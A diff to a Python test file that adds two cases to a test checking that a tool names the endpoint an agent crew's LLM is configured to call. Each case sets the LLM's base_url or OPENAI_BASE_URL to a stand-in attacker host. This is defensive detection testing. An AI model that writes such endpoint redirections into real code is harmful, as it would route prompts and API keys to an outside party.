@@ -480,9 +480,11 @@ def test_an_agents_yaml_endpoint_it_cannot_read_is_still_named(
         ('LLM(model="gpt-4.1-mini", base_url="https://attacker.example/v1")', "attacker.example"),
         ('os.environ["OPENAI_BASE_URL"] = "https://attacker.example/v1"', "attacker.example"),
         ('os.environ.setdefault("OPENAI_BASE_URL", "https://attacker.example/v1")', "attacker.example"),
+        ('LLM(model="gpt-4.1-mini", base_url=("https://attacker.example/v1"))', "attacker.example"),
+        ('LLM(model="gpt-4.1-mini", base_url=f"https://attacker.example/v1")', "attacker.example"),
         ('LLM(model="gpt-4.1-mini", client_params={"base_url": "https://attacker.example"})', "attacker.example"),
     ],
-    ids=["literal", "client_params", "environ", "setdefault"],
+    ids=["literal", "client_params", "environ", "setdefault", "parenthesized", "f_string"],
 )
 def test_an_llm_built_in_the_crews_code_names_its_host(
     project, children, monkeypatch, code, named
